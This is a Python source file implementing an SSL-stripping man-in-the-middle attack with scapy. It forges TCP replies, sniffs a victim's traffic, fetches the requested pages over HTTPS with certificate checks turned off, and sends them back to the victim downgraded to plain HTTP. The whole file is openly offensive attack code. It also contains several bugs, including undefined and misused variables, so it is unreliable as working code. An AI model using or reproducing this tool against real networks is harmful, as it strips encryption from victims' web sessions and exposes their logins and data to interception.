from scapy.all import *
import requests
from scapy.layers.inet import IP, TCP
from scapy.layers import http
from scapy.layers.http import HTTPRequest

#1. victim sends http get request through attacker bcs he is MITM due to arp 
#2. attacker takes said request and forwards it to the server using https 
#3. attacker receives response from server in https and strips it down to http for use in communication with the victim
#4. attacker sends new stripped packet to victim




class SSLstrip:

    class http_obj:
        def __init__(self, headers, request,get_request):

            self.dic = {
                "headers" : headers,
                "url" : request,
                "get" : get_request
            }

        def __str__(self):
            return self.dic

        def __repr__(self):
            print(self.dic)

        
    def __init__(self, port, victim):
        self.port = port
        self.victim_ip = victim 


    ##TCP response for tcp connection request
    def __craft_TCP_response(self,packet):
        print("Starting TCP connection")

        ether = Ether(src = get_if_hwaddr(conf.iface), dst = packet[Ether].src)
        ip = IP(src = packet.dst, dst = packet.src)
        tcp = TCP(sport = packet[TCP].dport, dport = packet[TCP].sport ,seq = packet[TCP].ack, ack = packet[TCP].seq + 1, flags = "SA")

        result_packet = ether/ip/tcp

        return result_packet

    def __from_raw_HTTP_to_HTTPobj(self, raw_str):

        #split by get separator to separate data from headers
        request_by_line  = raw_str.split("\\r\\n")

        headers = {}
        url = ""
        get_request = ""

        for line in request_by_line:
            #separating headers into two parts in order to denote  
            header = {"first" : line.split(":")[0], "second" : line.split(":")[1]}
            if "GET" in header["first"]:
                get_request = headers["second"][:-9]

            elif "Host" in header["first"]:
                url = headers["second"]

            elif header["first"] != "" and header["first"][0] != "b":
                headers.update({headers["first"] : headers["second"]})

        return http_obj(headers,url,get_request)

    
    def __from_HTTPobj_to_HTTPS_raw(self,http_request, http_get):
        return "https://" + http_request + http_get
    def __from_Raw_HTTP_response_to_scapy_packet(self, raw_http_response, request_packet):
        ether = Ether(src=get_if_hwaddr(conf.iface), dst=request_packet[Ether].src)
        ip = IP(src=request_packet[IP].dst, dst=request_packet[IP].src)
        tcp = TCP(sport=request_packet[TCP].dport, dport=request_packet[TCP].sport, ack = request_packet[TCP].seq + 1, seq = request_packet[TCP].ack, flags="FA")

        result_packet = ether / ip / tcp / raw_http_response

        return result_packet

    def __from_HTTPS_requests_to_HTTP_raw(self,response):
        separator = "\r\n"

        result = f"HTTP/1.1 {response.status_code}{separator}"
        
        #adding headers to the raw http requests
        for header in response.headers:
            result = result + f"{header}: {response.headers.get(header)}{separator}"

        #HTML
        result = result + f"\n{response.text}{separator*2}"
        return result


    def proc_packet(self,packet):
        ### check for TCP connection

        if packet[TCP].flags == 'S':
            ### establish TCP connection with the target victim

            sendp(self.__craft_TCP_response(packet), verbose = 0, iface = conf.iface)


        ### check for HTTP request coming from victim
        if pkt[IP].src == self.victim_ip and packet.haslayer(Raw):
            

            #HTTP raw -> HTTP_obj | raw HTTP get request from the user needed to construct a HTTPS request to the server
            http_data = self.__from_raw_HTTP_to_HTTPobj(str(packet[Raw]))


            ### send HTTPS request from victim to target server
            #HTTP_obj -> HTTPS raw -> HTTPS raw requests | response from the server 
            server_response = requests.get(self.__from_HTTPobj_to_HTTPS_raw(http_data["url"], http_data["get"]), verify=False, headers = http_data["headers"])


            ##scapy http packet mimicking the server's response to be sent to the user
            # HTTPS requests -> HTTP raw -> scapypacket | to be sent to the user
            scapy_HTTP_response_packet = self.__from_Raw_HTTP_response_to_scapy_packet( self.__from_HTTPS_requests_to_HTTP_raw(server_response) ,packet)

       
        ### send response as HTTP to victim 
        sendp(scapy_HTTP_response_packet,verbose = 0, iface = conf.iface)

    def start(self):
         #sniffing for new packets 
         sniff(filter="port " + str(self.port), prn=self.proc_packet, iface=conf.iface)

if __name__ ==  "__main__":
    print("File is not meant to be ran as main")